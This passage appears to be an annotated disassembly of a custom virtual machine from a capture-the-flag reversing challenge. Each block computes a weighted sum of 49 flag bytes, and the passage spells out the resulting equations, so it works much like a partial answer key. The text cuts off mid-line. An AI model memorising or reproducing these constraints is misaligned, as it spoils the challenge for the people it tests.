push(#000000d2)\n043ac : TA               push(pop() * pop())\n043ae : TCCGATTCCCCC     push(mem[#029c])\n043ba : CCAGAACCCCCC     push(#0000005d)\n043c6 : TA               push(pop() * pop())\n043c8 : TCAGATTCCCCC     push(mem[#029d])\n043d4 : CCAAATCCCCCC     push(#00000095)\n043e0 : TA               push(pop() * pop())\n043e2 : TCTGATTCCCCC     push(mem[#029e])\n043ee : CCCGTTCCCCCC     push(#000000ac)\n043fa : TA               push(pop() * pop())\n043fc : TCGGATTCCCCC     push(mem[#029f])\n04408 : CCAACCCCCCCC     push(#00000005)\n04414 : TA               push(pop() * pop())\n04416 : TCCCTTTCCCCC     push(mem[#02a0])\n04422 : CCTGCCCCCCCC     push(#0000000e)\n0442e : TA               push(pop() * pop())\n04430 : TCACTTTCCCCC     push(mem[#02a1])\n0443c : CCGGCGCCCCCC     push(#000000cf)\n04448 : TA               push(pop() * pop())\n0444a : TCTCTTTCCCCC     push(mem[#02a2])\n04456 : CCTTGTCCCCCC     push(#000000ba)\n04462 : TA               push(pop() * pop())\n04464 : TCGCTTTCCCCC     push(mem[#02a3])\n04470 : CCCGGACCCCCC     push(#0000007c)\n0447c : TA               push(pop() * pop())\n0447e : TCCATTTCCCCC     push(mem[#02a4])\n0448a : CCCGGTCCCCCC     push(#000000bc)\n04496 : TA               push(pop() * pop())\n04498 : TCAATTTCCCCC     push(mem[#02a5])\n044a4 : CCGAGGCCCCCC     push(#000000f7)\n044b0 : TA               push(pop() * pop())\n044b2 : TCTATTTCCCCC     push(mem[#02a6])\n044be : CCACTTCCCCCC     push(#000000a1)\n044ca : TA               push(pop() * pop())\n044cc : TCGATTTCCCCC     push(mem[#02a7])\n044d8 : CCTGTGCCCCCC     push(#000000ee)\n044e4 : TA               push(pop() * pop())\n044e6 : TCCTTTTCCCCC     push(mem[#02a8])\n044f2 : CCGAAGCCCCCC     push(#000000d7)\n044fe : TA               push(pop() * pop())\n04500 : TCATTTTCCCCC     push(mem[#02a9])\n0450c : CCTCTGCCCCCC     push(#000000e2)\n04518 : TA               push(pop() * pop())\n0451a : TCTTTTTCCCCC     push(mem[#02aa])\n04526 : CCCCGCCCCCCC     push(#00000030)\n04532 : TA               push(pop() * pop())\n04534 : TCGTTTTCCCCC     push(mem[#02ab])\n04540 : CCTTACCCCCCC     push(#0000001a)\n0454c : TA               push(pop() * pop())\n0454e : TCCGTTTCCCCC     push(mem[#02ac])\n0455a : CCATGTCCCCCC     push(#000000b9)\n04566 : TA               push(pop() * pop())\n04568 : TCAGTTTCCCCC     push(mem[#02ad])\n04574 : CCTTTTCCCCCC     push(#000000aa)\n04580 : TA               push(pop() * pop())\n04582 : TCTGTTTCCCCC     push(mem[#02ae])\n0458e : CCCAAACCCCCC     push(#00000054)\n0459a : TA               push(pop() * pop())\n0459c : TCGGTTTCCCCC     push(mem[#02af])\n045a8 : CCAGGGCCCCCC     push(#000000fd)\n045b4 : TA               push(pop() * pop())\n045b6 : TCCCGTTCCCCC     push(mem[#02b0])\n045c2 : CCCGAACCCCCC     push(#0000005c)\n045ce : TA               push(pop() * pop())\n045d0 : CA               push(pop() + pop())\n045d2 : CA               push(pop() + pop())\n045d4 : CA               push(pop() + pop())\n045d6 : CA               push(pop() + pop())\n045d8 : CA               push(pop() + pop())\n045da : CA               push(pop() + pop())\n045dc : CA               push(pop() + pop())\n045de : CA               push(pop() + pop())\n045e0 : CA               push(pop() + pop())\n045e2 : CA               push(pop() + pop())\n045e4 : CA               push(pop() + pop())\n045e6 : CA               push(pop() + pop())\n045e8 : CA               push(pop() + pop())\n045ea : CA               push(pop() + pop())\n045ec : CA               push(pop() + pop())\n045ee : CA               push(pop() + pop())\n045f0 : CA               push(pop() + pop())\n045f2 : CA               push(pop() + pop())\n045f4 : CA               push(pop() + pop())\n045f6 : CA               push(pop() + pop())\n045f8 : CA               push(pop() + pop())\n045fa : CA               push(pop() + pop())\n045fc : CA               push(pop() + pop())\n045fe : CA               push(pop() + pop())\n04600 : CA               push(pop() + pop())\n04602 : CA               push(pop() + pop())\n04604 : CA               push(pop() + pop())\n04606 : CA               push(pop() + pop())\n04608 : CA               push(pop() + pop())\n0460a : CA               push(pop() + pop())\n0460c : CA               push(pop() + pop())\n0460e : CA               push(pop() + pop())\n04610 : CA               push(pop() + pop())\n04612 : CA               push(pop() + pop())\n04614 : CA               push(pop() + pop())\n04616 : CA               push(pop() + pop())\n04618 : CA               push(pop() + pop())\n0461a : CA               push(pop() + pop())\n0461c : CA               push(pop() + pop())\n0461e : CA               push(pop() + pop())\n04620 : CA               push(pop() + pop())\n04622 : CA               push(pop() + pop())\n04624 : CA               push(pop() + pop())\n04626 : CA               push(pop() + pop())\n04628 : CA               push(pop() + pop())\n0462a : CA               push(pop() + pop())\n0462c : CA               push(pop() + pop())\n0462e : CA               push(pop() + pop())\n04630 : GCCCGCCCACCC     mem[#1030] := pop()           memory[#01030] := ((flag[0] * 135) + ((flag[1] * 96) + ((flag[2] * 194) + ((flag[3] * 108) + ((flag[4] * 97) + ((flag[5] * 191) + ((flag[6] * 20) + ((flag[7] * 140) + ((flag[8] * 113) + ((flag[9] * 63) + ((flag[10] * 145) + ((flag[11] * 97) + ((flag[12] * 221) + ((flag[13] * 100) + ((flag[14] * 89) + ((flag[15] * 38) + ((flag[16] * 8) + ((flag[17] * 31) + ((flag[18] * 47) + ((flag[19] * 68) + ((flag[20] * 225) + ((flag[21] * 54) + ((flag[22] * 124) + ((flag[23] * 140) + ((flag[24] * 215) + ((flag[25] * 189) + ((flag[26] * 167) + ((flag[27] * 210) + ((flag[28] * 93) + ((flag[29] * 149) + ((flag[30] * 172) + ((flag[31] * 5) + ((flag[32] * 14) + ((flag[33] * 207) + ((flag[34] * 186) + ((flag[35] * 124) + ((flag[36] * 188) + ((flag[37] * 247) + ((flag[38] * 161) + ((flag[39] * 238) + ((flag[40] * 215) + ((flag[41] * 226) + ((flag[42] * 48) + ((flag[43] * 26) + ((flag[44] * 185) + ((flag[45] * 170) + ((flag[46] * 84) + ((flag[47] * 253) + (flag[48] * 92)))))))))))))))))))))))))))))))))))))))))))))))))\n0463c : TCCCCTTCCCCC     push(mem[#0280])\n04648 : CCAGAGCCCCCC     push(#000000dd)\n04654 : TA               push(pop() * pop())\n04656 : TCACCTTCCCCC     push(mem[#0281])\n04662 : CCAATGCCCCCC     push(#000000e5)\n0466e : TA               push(pop() * pop())\n04670 : TCTCCTTCCCCC     push(mem[#0282])\n0467c : CCCGCCCCCCCC     push(#0000000c)\n04688 : TA               push(pop() * pop())\n0468a : TCGCCTTCCCCC     push(mem[#0283])\n04696 : CCTTGACCCCCC     push(#0000007a)\n046a2 : TA               push(pop() * pop())\n046a4 : TCCACTTCCCCC     push(mem[#0284])\n046b0 : CCTGACCCCCCC     push(#0000001e)\n046bc : TA               push(pop() * pop())\n046be : TCAACTTCCCCC     push(mem[#0285])\n046ca : CCAGTTCCCCCC     push(#000000ad)\n046d6 : TA               push(pop() * pop())\n046d8 : TCTACTTCCCCC     push(mem[#0286])\n046e4 : CCGTTTCCCCCC     push(#000000ab)\n046f0 : TA               push(pop() * pop())\n046f2 : TCGACTTCCCCC     push(mem[#0287])\n046fe : CCCGGTCCCCCC     push(#000000bc)\n0470a : TA               push(pop() * pop())\n0470c : TCCTCTTCCCCC     push(mem[#0288])\n04718 : CCCCCACCCCCC     push(#00000040)\n04724 : TA               push(pop() * pop())\n04726 : TCATCTTCCCCC     push(mem[#0289])\n04732 : CCGACGCCCCCC     push(#000000c7)\n0473e : TA               push(pop() * pop())\n04740 : TCTTCTTCCCCC     push(mem[#028a])\n0474c : CCCCACCCCCCC     push(#00000010)\n04758 : TA               push(pop() * pop())\n0475a : TCGTCTTCCCCC     push(mem[#028b])\n04766 : CCACAGCCCCCC     push(#000000d1)\n04772 : TA               push(pop() * pop())\n04774 : TCCGCTTCCCCC     push(mem[#028c])\n04780 : CCAGAGCCCCCC     push(#000000dd)\n0478c : TA               push(pop() * pop())\n0478e : TCAGCTTCCCCC     push(mem[#028d])\n0479a : CCGTCTCCCCCC     push(#0000008b)\n047a6 : TA               push(pop() * pop())\n047a8 : TCTGCTTCCCCC     push(mem[#028e])\n047b4 : CCAACCCCCCCC     push(#00000005)\n047c0 : TA               push(pop() * pop())\n047c2 : TCGGCTTCCCCC     push(mem[#028f])\n047ce : CCATGGCCCCCC     push(#000000f9)\n047da : TA               push(pop() * pop())\n047dc : TCCCATTCCCCC     push(mem[#0290])\n047e8 : CCCCGGCCCCCC     push(#000000f0)\n047f4 : TA               push(pop() * pop())\n047f6 : TCACATTCCCCC     push(mem[#0291])\n04802 : CCTAGACCCCCC     push(#00000076)\n0480e : TA               push(pop() * pop())\n04810 : TCTCATTCCCCC     push(mem[#0292])\n0481c : CCAATCCCCCCC     push(#00000025)\n04828 : TA               push(pop() * pop())\n0482a : TCGCATTCCCCC     push(mem[#0293])\n04836 : CCTGGACCCCCC     push(#0000007e)\n04842 : TA               push(pop() * pop())\n04844 : TCCAATTCCCCC     push(mem[#0294])\n04850 : CCCGGGCCCCCC     push(#000000fc)\n0485c : TA               push(pop() * pop())\n0485e : TCAAATTCCCCC     push(mem[#0295])\n0486a : CCAGGGCCCCCC     push(#000000fd)\n04876 : TA               push(pop() * pop())\n04878 : TCTAATTCCCCC     push(mem[#0296])\n04884 : CCGGAACCCCCC     push(#0000005f)\n04890 : TA               push(pop() * pop())\n04892 : TCGAATTCCCCC     push(mem[#0297])\n0489e : CCCGAACCCCCC     push(#0000005c)\n048aa : TA               push(pop() * pop())\n048ac : TCCTATTCCCCC     push(mem[#0298])\n048b8 : CCATCACCCCCC     push(#00000049)\n048c4 : TA               push(pop() * pop())\n048c6 : TCATATTCCCCC     push(mem[#0299])\n048d2 : CCACGGCCCCCC     push(#000000f1)\n048de : TA               push(pop() * pop())\n048e0 : TCTTATTCCCCC     push(mem[#029a])\n048ec : CCCGATCCCCCC     push(#0000009c)\n048f8 : TA               push(pop() * pop())\n048fa : TCGTATTCCCCC     push(mem[#029b])\n04906 : CCAACACCCCCC     push(#00000045)\n04912 : TA               push(pop() * pop())\n04914 : TCCGATTCCCCC     push(mem[#029c])\n04920 : CCCGTCCCCCCC     push(#0000002c)\n0492c : TA               push(pop() * pop())\n0492e : TCAGATTCCCCC     push(mem[#029d])\n0493a : CCAATGCCCCCC     push(#000000e5)\n04946 : TA               push(pop() * pop())\n04948 : TCTGATTCCCCC     push(mem[#029e])\n04954 : CCCCTGCCCCCC     push(#000000e0)\n04960 : TA               push(pop() * pop())\n04962 : TCGGATTCCCCC     push(mem[#029f])\n0496e : CCCTCCCCCCCC     push(#00000008)\n0497a : TA               push(pop() * pop())\n0497c : TCCCTTTCCCCC     push(mem[#02a0])\n04988 : CCTTGCCCCCCC     push(#0000003a)\n04994 : TA               push(pop() * pop())\n04996 : TCACTTTCCCCC     push(mem[#02a1])\n049a2 : CCGCTCCCCCCC     push(#00000023)\n049ae : TA               push(pop() * pop())\n049b0 : TCTCTTTCCCCC     push(mem[#02a2])\n049bc : CCTCATCCCCCC     push(#00000092)\n049c8 : TA               push(pop() * pop())\n049ca : TCGCTTTCCCCC     push(mem[#02a3])\n049d6 : CCGGTCCCCCCC     push(#0000002f)\n049e2 : TA               push(pop() * pop())\n049e4 : TCCATTTCCCCC     push(mem[#02a4])\n049f0 : CCACGTCCCCCC     push(#000000b1)\n049fc : TA               push(pop() * pop())\n049fe : TCAATTTCCCCC     push(mem[#02a5])\n04a0a : CCTGCTCCCCCC     push(#0000008e)\n04a16 : TA               push(pop() * pop())\n04a18 : TCTATTTCCCCC     push(mem[#02a6])\n04a24 : CCCATACCCCCC     push(#00000064)\n04a30 : TA               push(pop() * pop())\n04a32 : TCGATTTCCCCC     push(mem[#02a7])\n04a3e : CCCGATCCCCCC     push(#0000009c)\n04a4a : TA               push(pop() * pop())\n04a4c : TCCTTTTCCCCC     push(mem[#02a8])\n04a58 : CCAATCCCCCCC     push(#00000025)\n04a64 : TA               push(pop() * pop())\n04a66 : TCATTTTCCCCC     push(mem[#02a9])\n04a72 : CCCCCCCCCCCC     push(#00000000)\n04a7e : TA               push(pop() * pop())\n04a80 : TCTTTTTCCCCC     push(mem[#02aa])\n04a8c : CCACTACCCCCC     push(#00000061)\n04a98 : TA               push(pop() * pop())\n04a9a : TCGTTTTCCCCC     push(mem[#02ab])\n04aa6 : CCGCTGCCCCCC     push(#000000e3)\n04ab2 : TA               push(pop() * pop())\n04ab4 : TCCGTTTCCCCC     push(mem[#02ac])\n04ac0 : CCCATACCCCCC     push(#00000064)\n04acc : TA               push(pop() * pop())\n04ace : TCAGTTTCCCCC     push(mem[#02ad])\n04ada : CCAAGCCCCCCC     push(#00000035)\n04ae6 : TA               push(pop() * pop())\n04ae8 : TCTGTTTCCCCC     push(mem[#02ae])\n04af4 : CCCGCCCCCCCC     push(#0000000c)\n04b00 : TA               push(pop() * pop())\n04b02 : TCGGTTTCCCCC     push(mem[#02af])\n04b0e : CCCGAGCCCCCC     push(#000000dc)\n04b1a : TA               push(pop() * pop())\n04b1c : TCCCGTTCCCCC     push(mem[#02b0])\n04b28 : CCCAAGCCCCCC     push(#000000d4)\n04b34 : TA               push(pop() * pop())\n04b36 : CA               push(pop() + pop())\n04b38 : CA               push(pop() + pop())\n04b3a : CA               push(pop() + pop())\n04b3c : CA               push(pop() + pop())\n04b3e : CA               push(pop() + pop())\n04b40 : CA               push(pop() + pop())\n04b42 : CA               push(pop() + pop())\n04b44 : CA               push(pop() + pop())\n04b46 : CA               push(pop() + pop())\n04b48 : CA               push(pop() + pop())\n04b4a : CA               push(pop() + pop())\n04b4c : CA               push(pop() + pop())\n04b4e : CA               push(pop() + pop())\n04b50 : CA               push(pop() + pop())\n04b52 : CA               push(pop() + pop())\n04b54 : CA               push(pop() + pop())\n04b56 : CA               push(pop() + pop())\n04b58 : CA               push(pop() + pop())\n04b5a : CA               push(pop() + pop())\n04b5c : CA               push(pop() + pop())\n04b5e : CA               push(pop() + pop())\n04b60 : CA               push(pop() + pop())\n04b62 : CA               push(pop() + pop())\n04b64 : CA               push(pop() + pop())\n04b66 : CA               push(pop() + pop())\n04b68 : CA               push(pop() + pop())\n04b6a : CA               push(pop() + pop())\n04b6c : CA               push(pop() + pop())\n04b6e : CA               push(pop() + pop())\n04b70 : CA               push(pop() + pop())\n04b72 : CA               push(pop() + pop())\n04b74 : CA               push(pop() + pop())\n04b76 : CA               push(pop() + pop())\n04b78 : CA               push(pop() + pop())\n04b7a : CA               push(pop() + pop())\n04b7c : CA               push(pop() + pop())\n04b7e : CA               push(pop() + pop())\n04b80 : CA               push(pop() + pop())\n04b82 : CA               push(pop() + pop())\n04b84 : CA               push(pop() + pop())\n04b86 : CA               push(pop() + pop())\n04b88 : CA               push(pop() + pop())\n04b8a : CA               push(pop() + pop())\n04b8c : CA               push(pop() + pop())\n04b8e : CA               push(pop() + pop())\n04b90 : CA               push(pop() + pop())\n04b92 : CA               push(pop() + pop())\n04b94 : CA               push(pop() + pop())\n04b96 : GCCAGCCCACCC     mem[#1034] := pop()           memory[#01034] := ((flag[0] * 221) + ((flag[1] * 229) + ((flag[2] * 12) + ((flag[3] * 122) + ((flag[4] * 30) + ((flag[5] * 173) + ((flag[6] * 171) + ((flag[7] * 188) + ((flag[8] * 64) + ((flag[9] * 199) + ((flag[10] * 16) + ((flag[11] * 209) + ((flag[12] * 221) + ((flag[13] * 139) + ((flag[14] * 5) + ((flag[15] * 249) + ((flag[16] * 240) + ((flag[17] * 118) + ((flag[18] * 37) + ((flag[19] * 126) + ((flag[20] * 252) + ((flag[21] * 253) + ((flag[22] * 95) + ((flag[23] * 92) + ((flag[24] * 73) + ((flag[25] * 241) + ((flag[26] * 156) + ((flag[27] * 69) + ((flag[28] * 44) + ((flag[29] * 229) + ((flag[30] * 224) + ((flag[31] * 8) + ((flag[32] * 58) + ((flag[33] * 35) + ((flag[34] * 146) + ((flag[35] * 47) + ((flag[36] * 177) + ((flag[37] * 142) + ((flag[38] * 100) + ((flag[39] * 156) + ((flag[40] * 37) + ((flag[41] * 0) + ((flag[42] * 97) + ((flag[43] * 227) + ((flag[44] * 100) + ((flag[45] * 53) + ((flag[46] * 12) + ((flag[47] * 220) + (flag[48] * 212)))))))))))))))))))))))))))))))))))))))))))))))))\n04ba2 : TCCCCTTCCCCC     push(mem[#0280])\n04bae : CCGGAACCCCCC     push(#0000005f)\n04bba : TA               push(pop() * pop())\n04bbc : TCACCTTCCCCC     push(mem[#0281])\n04bc8 : CCGAAACCCCCC     push(#00000057)\n04bd4 : TA               push(pop() * pop())\n04bd6 : TCTCCTTCCCCC     push(mem[#0282])\n04be2 : CCCGTTCCCCCC     push(#000000ac)\n04bee : TA               push(pop() * pop())\n04bf0 : TCGCCTTCCCCC     push(mem[#0283])\n04bfc : CCCGGCCCCCCC     push(#0000003c)\n04c08 : TA               push(pop() * pop())\n04c0a : TCCACTTCCCCC     push(mem[#0284])\n04c16 : CCTAATCCCCCC     push(#00000096)\n04c22 : TA               push(pop() * pop())\n04c24 : TCAACTTCCCCC     push(mem[#0285])\n04c30 : CCTTCCCCCCCC     push(#0000000a)\n04c3c : TA               push(pop() * pop())\n04c3e : TCTACTTCCCCC     push(mem[#0286])\n04c4a : CCGACACCCCCC     push(#00000047)\n04c56 : TA               push(pop() * pop())\n04c58 : TCGACTTCCCCC     push(mem[#0287])\n04c64 : CCAGCTCCCCCC     push(#0000008d)\n04c70 : TA               push(pop() * pop())\n04c72 : TCCTCTTCCCCC     push(mem[#0288])\n04c7e : CCTCGCCCCCCC     push(#00000032)\n04c8a : TA               push(pop() * pop())\n04c8c : TCATCTTCCCCC     push(mem[#0289])\n04c98 : CCCGCGCCCCCC     push(#000000cc)\n04ca4 : TA               push(pop() * pop())\n04ca6 : TCTTCTTCCCCC     push(mem[#028a])\n04cb2 : CCATCGCCCCCC     push(#000000c9)\n04cbe : TA               push(pop() * pop())\n04cc0 : TCGTCTTCCCCC     push(mem[#028b])\n04ccc : CCCAAGCCCCCC     push(#000000d4)\n04cd8 : TA               push(pop() * pop())\n04cda : TCCGCTTCCCCC     push(mem[#028c])\n04ce6 : CCCTGGCCCCCC     push(#000000f8)\n04cf2 : TA               push(pop() * pop())\n04cf4 : TCAGCTTCCCCC     push(mem[#028d])\n04d00 : CCGTTGCCCCCC     push(#000000eb)\n04d0c : TA               push(pop() * pop())\n04d0e : TCTGCTTCCCCC     push(mem[#028e])\n04d1a : CCGCGACCCCCC     push(#00000073)\n04d26 : TA               push(pop() * pop())\n04d28 : TCGGCTTCCCCC     push(mem[#028f])\n04d34 : CCCGCACCCCCC     push(#0000004c)\n04d40 : TA               push(pop() * pop())\n04d42 : TCCCATTCCCCC     push(mem[#0290])\n04d4e : CCCTGCCCCCCC     push(#00000038)\n04d5a : TA               push(pop() * pop())\n04d5c : TCACATTCCCCC     push(mem[#0291])\n04d68 : CCCCTCCCCCCC     push(#00000020)\n04d74 : TA               push(pop() * pop())\n04d76 : TCTCATTCCCCC     push(mem[#0292])\n04d82 : CCTCAACCCCCC     push(#00000052)\n04d8e : TA               push(pop() * pop())\n04d90 : TCGCATTCCCCC     push(mem[#0293])\n04d9c : CCATTTCCCCCC     push(#000000a9)\n04da8 : TA               push(pop() * pop())\n04daa : TCCAATTCCCCC     push(mem[#0294])\n04db6 : CCGCAACCCCCC     push(#00000053)\n04dc2 : TA               push(pop() * pop())\n04dc4 : TCAAATTCCCCC     push(mem[#0295])\n04dd0 : CCTGCGCCCCCC     push(#000000ce)\n04ddc : TA               push(pop() * pop())\n04dde : TCTAATTCCCCC     push(mem[#0296])\n04dea : CCGGTTCCCCCC     push(#000000af)\n04df6 : TA               push(pop() * pop())\n04df8 : TCGAATTCCCCC     push(mem[#0297])\n04e04 : CCGCAACCCCCC     push(#00000053)\n04e10 : TA               push(pop() * pop())\n04e12 : TCCTATTCCCCC     push(mem[#0298])\n04e1e : CCGGAGCCCCCC     push(#000000df)\n04e2a : TA               push(pop() * pop())\n04e2c : TCATATTCCCCC     push(mem[#0299])\n04e38 : CCCATACCCCCC     push(#00000064)\n04e44 : TA               push(pop() * pop())\n04e46 : TCTTATTCCCCC     push(mem[#029a])\n04e52 : CCCAGGCCCCCC     push(#000000f4)\n04e5e : TA               push(pop() * pop())\n04e60 : TCGTATTCCCCC     push(mem[#029b])\n04e6c : CCTCTCCCCCCC     push(#00000022)\n04e78 : TA               push(pop() * pop())\n04e7a : TCCGATTCCCCC     push(mem[#029c])\n04e86 : CCGGGACCCCCC     push(#0000007f)\n04e92 : TA               push(pop() * pop())\n04e94 : TCAGATTCCCCC     push(mem[#029d])\n04ea0 : CCCTACCCCCCC     push(#00000018)\n04eac : TA               push(pop() * pop())\n04eae : TCTGATTCCCCC     push(mem[#029e])\n04eba : CCCGCACCCCCC     push(#0000004c)\n04ec6 : TA               push(pop() * pop())\n04ec8 : TCGGATTCCCCC     push(mem[#029f])\n04ed4 : CCCTCTCCCCCC     push(#00000088)\n04ee0 : TA               push(pop() * pop())\n04ee2 : TCCCTTTCCCCC     push(mem[#02a0])\n04eee : CCCCCTCCCCCC     push(#00000080)\n04efa : TA               push(pop() * pop())\n04efc : TCACTTTCCCCC     push(mem[#02a1])\n04f08 : CCTCTGCCCCCC     push(#000000e2)\n04f14 : TA               push(pop() * pop())\n04f16 : TCTCTTTCCCCC     push(mem[#02a2])\n04f22 : CCTCATCCCCCC     push(#00000092)\n04f2e : TA               push(pop() * pop())\n04f30 : TCGCTTTCCCCC     push(mem[#02a3])\n04f3c : CCGTGTCCCCCC     push(#000000bb)\n04f48 : TA               push(pop() * pop())\n04f4a : TCCATTTCCCCC     push(mem[#02a4])\n04f56 : CCGCGCCCCCCC     push(#00000033)\n04f62 : TA               push(pop() * pop())\n04f64 : TCAATTTCCCCC     push(mem[#02a5])\n04f70 : CCCTTGCCCCCC     push(#000000e8)\n04f7c : TA               push(pop() * pop())\n04f7e : TCTATTTCCCCC     push(mem[#02a6])\n04f8a : CCCGTGCCCCCC     push(#000000ec)\n04f96 : TA               push(pop() * pop())\n04f98 : TCGATTTCCCCC     push(mem[#02a7])\n04fa4 : CCAAGCCCCCCC     push(#00000035)\n04fb0 : TA               push(pop() * pop())\n04fb2 : TCCTTTTCCCCC     push(mem[#02a8])\n04fbe : CCCGGCCCCCCC     push(#0000003c)\n04fca : TA               push(pop() * pop())\n04fcc : TCATTTTCCCCC     push(mem[#02a9])\n04fd8 : CCTATCCCCCCC     push(#00000026)\n04fe4 : TA               push(pop() * pop())\n04fe6 : TCTTTTTCCCCC     push(mem[#02aa])\n04ff2 : CCTAGCCCCCCC     push(#00000036)\n04ffe : TA               push(pop() * pop())\n05000 : TCGTTTTCCCCC     push(mem[#02ab])\n0500c : CCGCGCCCCCCC     push(#00000033)\n05018 : TA               push(pop() * pop())\n0501a : TCCGTTTCCCCC     push(mem[#02ac])\n05026 : CCCCCCCCCCCC     push(#00000000)\n05032 : TA               push(pop() * pop())\n05034 : TCAGTTTCCCCC     push(mem[#02ad])\n05040 : CCCATGCCCCCC     push(#000000e4)\n0504c : TA               push(pop() * pop())\n0504e : TCTGTTTCCCCC     push(mem[#02ae])\n0505a : CCTCGACCCCCC     push(#00000072)\n05066 : TA               push(pop() * pop())\n05068 : TCGGTTTCCCCC     push(mem[#02af])\n05074 : CCTCTCCCCCCC     push(#00000022)\n05080 : TA               push(pop() * pop())\n05082 : TCCCGTTCCCCC     push(mem[#02b0])\n0508e : CCATGTCCCCCC     push(#000000b9)\n0509a : TA               push(pop() * pop())\n0509c : CA               push(pop() + pop())\n0509e : CA               push(pop() + pop())\n050a0 : CA               push(pop() + pop())\n050a2 : CA               push(pop() + pop())\n050a4 : CA               push(pop() + pop())\n050a6 : CA               push(pop() + pop())\n050a8 : CA               push(pop() + pop())\n050aa : CA               push(pop() + pop())\n050ac : CA               push(pop() + pop())\n050ae : CA               push(pop() + pop())\n050b0 : CA               push(pop() + pop())\n050b2 : CA               push(pop() + pop())\n050b4 : CA               push(pop() + pop())\n050b6 : CA               push(pop() + pop())\n050b8 : CA               push(pop() + pop())\n050ba : CA               push(pop() + pop())\n050bc : CA               push(pop() + pop())\n050be : CA               push(pop() + pop())\n050c0 : CA               push(pop() + pop())\n050c2 : CA               push(pop() + pop())\n050c4 : CA               push(pop() + pop())\n050c6 : CA               push(pop() + pop())\n050c8 : CA               push(pop() + pop())\n050ca : CA               push(pop() + pop())\n050cc : CA               push(pop() + pop())\n050ce : CA               push(pop() + pop())\n050d0 : CA               push(pop() + pop())\n050d2 : CA               push(pop() + pop())\n050d4 : CA               push(pop() + pop())\n050d6 : CA               push(pop() + pop())\n050d8 : CA               push(pop() + pop())\n050da : CA               push(pop() + pop())\n050dc : CA               push(pop() + pop())\n050de : CA               push(pop() + pop())\n050e0 : CA               push(pop() + pop())\n050e2 : CA               push(pop() + pop())\n050e4 : CA               push(pop() + pop())\n050e6 : CA               push(pop() + pop())\n050e8 : CA               push(pop() + pop())\n050ea : CA               push(pop() + pop())\n050ec : CA               push(pop() + pop())\n050ee : CA               push(pop() + pop())\n050f0 : CA               push(pop() + pop())\n050f2 : CA               push(pop() + pop())\n050f4 : CA               push(pop() + pop())\n050f6 : CA               push(pop() + pop())\n050f8 : CA               push(pop() + pop())\n050fa : CA               push(pop() + pop())\n050fc : GCCTGCCCACCC     mem[#1038] := pop()           memory[#01038] := ((flag[0] * 95) + ((flag[1] * 87) + ((flag[2] * 172) + ((flag[3] * 60) + ((flag[4] * 150) + ((flag[5] * 10) + ((flag[6] * 71) + ((flag[7] * 141) + ((flag[8] * 50) + ((flag[9] * 204) + ((flag[10] * 201) + ((flag[11] * 212) + ((flag[12] * 248) + ((flag[13] * 235) + ((flag[14] * 115) + ((flag[15] * 76) + ((flag[16] * 56) + ((flag[17] * 32) + ((flag[18] * 82) + ((flag[19] * 169) + ((flag[20] * 83) + ((flag[21] * 206) + ((flag[22] * 175) + ((flag[23] * 83) + ((flag[24] * 223) + ((flag[25] * 100) + ((flag[26] * 244) + ((flag[27] * 34) + ((flag[28] * 127) + ((flag[29] * 24) + ((flag[30] * 76) + ((flag[31] * 136) + ((flag[32] * 128) + ((flag[33] * 226) + ((flag[34] * 146) + ((flag[35] * 187) + ((flag[36] * 51) + ((flag[37] * 232) + ((flag[38] * 236) + ((flag[39] * 53) + ((flag[40] * 60) + ((flag[41] * 38) + ((flag[42] * 54) + ((flag[43] * 51) + ((flag[44] * 0) + ((flag[45] * 228) + ((flag[46] * 114) + ((flag[47] * 34) + (flag[48] * 185)))))))))))))))))))))))))))))))))))))))))))))))))\n05108 : TCCCCTTCCCCC     push(mem[#0280])\n05114 : CCGTGGCCCCCC     push(#000000fb)\n05120 : TA               push(pop() * pop())\n05122 : TCACCTTCCCCC     push(mem[#0281])\n0512e : CCGTGCCCCCCC     push(#0000003b)\n0513a : TA               push(pop() * pop())\n0513c : TCTCCTTCCCCC     push(mem[#0282])\n05148 : CCGGCGCCCCCC     push(#000000cf)\n05154 : TA               push(pop() * pop())\n05156 : TCGCCTTCCCCC     push(mem[#0283])\n05162 : CCCCCACCCCCC     push(#00000040)\n0516e : TA               push(pop() * pop())\n05170 : TCCACTTCCCCC     push(mem[#0284])\n0517c : CCGGTTCCCCCC     push(#000000af)\n05188 : TA               push(pop() * pop())\n0518a : TCAACTTCCCCC     push(mem[#0285])\n05196 : CCAGCACCCCCC     push(#0000004d)\n051a2 : TA               push(pop() * pop())\n051a4 : TCTACTTCCCCC     push(mem[#0286])\n051b0 : CCTGAACCCCCC     push(#0000005e)\n051bc : TA               push(pop() * pop())\n051be : TCGACTTCCCCC     push(mem[#0287])\n051ca : CCGCGGCCCCCC     push(#000000f3)\n051d6 : TA               push(pop() * pop())\n051d8 : TCCTCTTCCCCC     push(mem[#0288])\n051e4 : CCTGAGCCCCCC     push(#000000de)\n051f0 : TA               push(pop() * pop())\n051f2 : TCATCTTCCCCC     push(mem[#0289])\n051fe : CCACAACCCCCC     push(#00000051)\n0520a : TA               push(pop() * pop())\n0520c : TCTTCTTCCCCC     push(mem[#028a])\n05218 : CCTTCTCCCCCC     push(#0000008a)\n05224 : TA               push(pop() * pop())\n05226 : TCGTCTTCCCCC     push(mem[#028b])\n05232 : CCCCGTCCCCCC     push(#000000b0)\n0523e : TA               push(pop() * pop())\n05240 : TCCGCTTCCCCC     push(mem[#028c])\n0524c : CCGGTTCCCCCC     push(#000000af)\n05258 : TA               push(pop() * pop())\n0525a : TCAGCTTCCCCC     push(mem[#028d])\n05266 : CCGCAACCCCCC     push(#00000053)\n05272 : TA               push(pop() * pop())\n05274 : TCTGCTTCCCCC     push(mem[#028e])\n05280 : CCTTCACCCCCC     push(#0000004a)\n0528c : TA               push(pop() * pop())\n0528e : TCGGCTTCCCCC     push(mem[#028f])\n0529a : CCCCTTCCCCCC     push(#000000a0)\n052a6 : TA               push(pop() * pop())\n052a8 : TCCCATTCCCCC     push(mem[#0290])\n052b4 : CCGCGGCCCCCC     push(#000000f3)\n052c0 : TA               push(pop() * pop())\n052c2 : TCACATTCCCCC     push(mem[#0291])\n052ce : CCCCCTCCCCCC     push(#00000080)\n052da : TA               push(pop() * pop())\n052dc : TCTCATTCCCCC     push(mem[#0292])\n052e8 : CCTGAGCCCCCC     push(#000000de)\n052f4 : TA               push(pop() * pop())\n052f6 : TCGCATTCCCCC     push(mem[#0293])\n05302 : CCCTGCCCCCCC     push(#00000038)\n0530e : TA               push(pop() * pop())\n05310 : TCCAATTCCCCC     push(mem[#0294])\n0531c : CCGACCCCCCCC     push(#00000007)\n05328 : TA               push(pop() * pop())\n0532a : TCAAATTCCCCC     push(mem[#0295])\n05336 : CCCCTTCCCCCC     